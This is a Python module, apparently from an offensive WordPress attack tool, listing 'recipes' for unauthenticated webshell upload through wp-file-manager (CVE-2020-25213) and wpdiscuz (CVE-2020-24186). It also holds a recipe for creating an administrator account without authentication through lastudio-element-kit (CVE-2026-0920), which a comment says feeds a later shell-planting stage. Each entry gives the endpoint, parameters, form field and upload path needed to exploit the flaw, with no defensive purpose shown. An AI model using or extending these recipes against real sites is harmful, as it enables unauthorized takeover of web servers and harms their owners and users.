"""Curated unauthenticated WordPress webshell-upload recipes."""

RECIPES = [
    {
        "plugin": "wp-file-manager",
        "cve": "CVE-2020-25213",
        "affected": "<=6.8",
        "method": "POST",
        "endpoint": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        "params": {"cmd": "upload", "target": "l1_Lw"},
        "field": "upload[]",
        "upload_path": "/wp-content/plugins/wp-file-manager/lib/files/{filename}",
        "source": "registry",
        "note": "elFinder connector exposed unauthenticated; no extension check.",
    },
    {
        "plugin": "wpdiscuz",
        "cve": "CVE-2020-24186",
        "affected": ">=7.0.0,<=7.0.4",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "wmuUploadFiles", "wmu_nonce": ""},
        "field": "wmu_files[0]",
        "upload_path": "/wp-content/uploads/{filename}",
        "source": "registry",
        "note": "wmuUploadFiles trusts forged mime-type; drops PHP into uploads/.",
    },
]


def find_recipes(plugin_slug):
    return [r for r in RECIPES if r["plugin"] == plugin_slug]


# ── Track B: privilege-escalation recipes (unauth → admin account) ────────────
# These don't upload a shell directly; they grant an ADMIN account, which the
# authenticated-webshell stage (wp_authshell) then uses to plant a shell.
PRIVESC_RECIPES = [
    {
        "plugin": "lastudio-element-kit",
        "cve": "CVE-2026-0920",
        "affected": "<=1.5.6.3",
        "kind": "register-role",
        "endpoint": "/wp-admin/admin-ajax.php",
        # ajax_register_handle is hooked to a nopriv AJAX action; the exact
        # action string should be confirmed against the plugin source / PoC.
        "action": "lastudio_register",
        "user_field": "user_login",
        "email_field": "email",
        "pass_field": "password",
        "role_param": "lakit_bkrole",
        "role_value": "administrator",
        "source": "registry",
        "note": "ajax_register_handle honours lakit_bkrole → unauth admin registration.",
    },
]


def find_privesc(plugin_slug):
    return [r for r in PRIVESC_RECIPES if r["plugin"] == plugin_slug]
